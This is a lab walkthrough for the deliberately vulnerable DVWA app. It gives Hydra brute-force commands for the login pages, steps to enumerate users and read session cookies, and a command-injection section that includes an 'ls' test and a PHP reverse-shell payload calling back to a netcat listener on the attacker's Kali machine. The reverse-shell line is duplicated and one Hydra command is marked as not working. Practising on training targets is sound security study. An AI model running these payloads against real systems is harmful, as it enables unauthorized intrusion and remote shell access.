## Set up DVWA

You'll need to set up the DVWA. To do this type any letter or word in the `username` and `password` fields. You'll be directed to the **Database Setup page**. Go to the bottom of the page and click the `Create / Reset Databse` button. Once the database has been created you'll be redirected to the login screen once more.  

## Brute Force the login page

<img alt="Hydra" src="https://img.shields.io/badge/-Hydra-1a73e8?style=flat-square&logo=Hydra&logoColor=white" />

MACHINE_IP/login.php

` hydra -l admin -P <path/to/password/file> MACHINE_IP http-post-form "/login.php:username=^USER^&password=^PASS^:F='Login failed'" -V `

MACHINE_IP/vulnerabilities/brute/

##### Vulnerability Level: 

[![css progressbar](https://readme-components.vercel.app/api?component=linearprogress&skill=Low&value=25)](https://github.com/harish-sethuraman/readme-components)

Before trying to brute force again I will used the same credientals used to log into the site.

The credentials worked and a picture was shown below. Right-Click the image and `Copy Image Link` and put it into the broswer. The link should look like this `MACHINEIP/hackable/users/admin.jpg`. Move up to the parent direcotry ``MACHINEIP/hackable/users/`. Here you'll get a list of the users on the site.

Open the `Web Developer Tools` by pressing `CTRL, SHIFT, I`. Go to the storage tab and make note of the Cookies.

Lets try to brute force the other users!
` hydra -l 1337 -P <path/to/password/file> MACHINE_IP http-post-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:S=Username and/or password incorrect.:H=Cookie=security=low;PHPSESSID=<value for PHP SESSID cookie" -V ` --This does not work currently


## Command Injection

##### Vulnerability Level: 

[![css progressbar](https://readme-components.vercel.app/api?component=linearprogress&skill=Low&value=25)](https://github.com/harish-sethuraman/readme-components)

1. Testing for vulnerability by listing the directories
` 8.8.8.8;ls `

2. Gaining a Reverse Shell
    - Open a netcat listener in Kali terminal
    ` nc -lnvp 4242`

    - Past this code in the 'Enter an IP address: ' form. Make sure to prepend an IP address for the ping command to run and the reverse shell to work.
    `8.8.8.8;php -r '$sock=fsockopen("<KaliMachineIP>",4242);exec("/bin/sh -i <&3 >&3 2>&3");' php -r '$sock=fsockopen("<kaliMACHINEIP>",4242);exec("/bin/sh -i <&3 >&3 2>&3");' `
